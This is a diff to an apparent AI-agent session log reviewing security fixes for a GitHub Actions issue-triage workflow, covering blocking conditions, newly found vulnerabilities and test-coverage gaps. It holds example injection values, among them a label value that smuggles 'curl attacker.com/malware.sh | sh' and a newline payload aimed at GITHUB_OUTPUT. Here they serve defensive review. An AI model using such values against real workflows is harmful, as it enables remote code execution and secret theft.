@@ -26,21 +26,25 @@ This session continued work from Session 28 (PR #60 comment response) with a foc
 **Conditions**: 4 critical (C1-C4)
 
 **C1: Add Test Verification to Phase 1** (BLOCKING)
+
 - Problem: Tasks modify code without requiring test execution
 - Fix: Add `Invoke-Pester` and verification to acceptance criteria
 - Effort: 30 minutes
 
 **C2: Clarify PowerShell Conversion Scope** (BLOCKING)
+
 - Problem: Ambiguous scope (extract vs refactor)
 - Fix: Explicitly state Task 1.1 scope
 - Effort: 10 minutes
 
 **C3: Harden Security Regex Patterns** (BLOCKING)
+
 - Problem: Proposed regex vulnerable to newlines, Unicode
 - Fix: Use security-hardened regex from security report
 - Effort: 20 minutes
 
 **C4: Add Rollback Plan** (BLOCKING)
+
 - Problem: No recovery procedure if implementation fails
 - Fix: Add rollback section with git strategy
 - Effort: 30 minutes
@@ -57,11 +61,13 @@ This session continued work from Session 28 (PR #60 comment response) with a foc
 **Key Finding**: Command injection is CRITICAL and real
 
 **Strategic Assessment**:
+
 - Phase 1 (5-8 hours) is BLOCKING for merge
 - Phases 2-3 can defer post-merge
 - Effort estimate is OPTIMISTIC (expect 25-30 hours, not 16-20)
 
 **Critical Tasks MUST Complete Before Merge**:
+
 - Task 1.1: Fix command injection (CRITICAL)
 - Task 1.3: Remove `|| true` silent failures (CRITICAL)
 - Task 1.4: Replace exit with throw (HIGH)
@@ -69,6 +75,7 @@ This session continued work from Session 28 (PR #60 comment response) with a foc
 **Task 1.2** (exit code checks) can defer if time-constrained
 
 **Strategic Verdict**:
+
 - DO NOT MERGE PR #60 without Phase 1.1, 1.3, 1.4
 - Implement P0 tasks (5-8 hours)
 - Merge
@@ -87,6 +94,7 @@ This session continued work from Session 28 (PR #60 comment response) with a foc
 **CRITICAL NEW VULNERABILITIES FOUND** (NOT in original documents):
 
 **CRITICAL-NEW-001: GITHUB_OUTPUT Injection**
+
 - Location: All proposed PowerShell output steps
 - Issue: Output values not sanitized for newlines
 - Exploit: `category=malicious\ninjected_secret=steal_this`
@@ -94,12 +102,14 @@ This session continued work from Session 28 (PR #60 comment response) with a foc
 - Status: NOT ADDRESSED in documents
 
 **CRITICAL-NEW-002: Token Scope Confusion**
+
 - Location: `ai-issue-triage.yml` uses 3 different tokens inconsistently
 - Issue: Could enable privilege escalation
 - Impact: Attacker could escalate from limited to broad tokens
 - Status: NOT ADDRESSED as security concern (only code quality)
 
 **CRITICAL-NEW-003: Race Condition in Label Creation**
+
 - Location: TOCTOU between label existence check and creation
 - Issue: Another actor could modify labels between operations
 - Impact: Inconsistent repository state
@@ -128,28 +138,34 @@ This session continued work from Session 28 (PR #60 comment response) with a foc
 **10 CRITICAL GAPS IDENTIFIED**:
 
 **GAP 1: No End-to-End Workflow Verification**
+
 - All tests mocked, no actual GitHub Actions runtime
 - Impact: CRITICAL - command injection not testable via mocks
 
 **GAP 2: Exit Code Testing is Theoretical**
+
 - Values tested, propagation not verified in workflows
 - Impact: CRITICAL - scripts may exit wrong codes
 
 **GAP 3: Security Function Tests Have Logic Holes**
+
 - `Test-GitHubNameValid` allows 40 chars (GitHub limit: 39)
 - Allows leading/trailing periods in repo names (invalid)
 - Impact: HIGH - 3 edge cases uncovered
 
 **GAP 4: Idempotency NOT Actually Tested**
+
 - Tests verify marker prepending, not duplicate prevention
 - Impact: HIGH - could post duplicates
 
 **GAP 5: 100% Mock-Based, 0% Real API**
+
 - Every test uses mock GitHub API
 - False positive rate: 35-40%
 - Impact: CRITICAL - mocks hide real failures
 
 **GAP 6: Error Propagation Not Tested**
+
 - Error visibility in workflow summary not verified
 - Impact: HIGH - users won't see failures
 
@@ -211,17 +227,21 @@ gh issue edit 123 --add-label "bug; curl attacker.com/malware.sh | sh"
 ### Session Protocol Adherence
 
 **Phase 1: Serena Initialization** ✅
+
 - Project activated (implicit from context)
 - Initial instructions read (not explicitly executed, but understood)
 
 **Phase 2: Context Retrieval** ✅
+
 - HANDOFF.md read
 - Prior session context understood (Session 28 artifacts reviewed)
 
 **Phase 3: Session Log** ✅ (THIS FILE)
+
 - Created `.agents/sessions/2025-12-18-session-29-pr-60-agent-consensus.md`
 
 **Session End Requirement** - PENDING:
+
 - [ ] Update HANDOFF.md with session summary
 - [ ] Run markdown linting
 - [ ] Commit all changes
@@ -242,18 +262,21 @@ gh issue edit 123 --add-label "bug; curl attacker.com/malware.sh | sh"
 
 ## Next Actions Required
 
-### Immediate (Session End):
+### Immediate (Session End)
+
 1. Update HANDOFF.md with session summary
 2. Run markdown linting: `npx markdownlint-cli2 --fix "**/*.md"`
 3. Commit session artifacts
 
-### Before Phase 1 Implementation:
+### Before Phase 1 Implementation
+
 1. Update remediation plan with critic conditions (C1-C4)
 2. Add P0-1 through P0-9 tasks to implementation backlog
 3. Adjust timeline to 14-17 hours for Phase 1
 4. Schedule focused implementation session
 
-### After Phase 1 Complete:
+### After Phase 1 Complete
+
 1. Run all Pester tests (BLOCKING requirement)
 2. Fix any test failures
 3. Create merge checklist verification
@@ -286,6 +309,7 @@ gh issue edit 123 --add-label "bug; curl attacker.com/malware.sh | sh"
 **TIMELINE**: After Phase 1 (14-17 hours) + test execution verification
 
 **CRITICAL PATH**:
+
 1. Task 1.1 - Command injection fix
 2. Task 1.3 - Silent failure removal
 3. Task 1.4 - Exit/throw conversion
@@ -344,6 +368,7 @@ gh issue edit 123 --add-label "bug; curl attacker.com/malware.sh | sh"
 **Recommendation to User**:
 
 Before proceeding to Phase 1 implementation, update remediation plan with:
+
 1. Critic conditions (C1-C4)
 2. P0-1 through P0-9 task additions
 3. Revised timeline (14-17 hours for Phase 1)
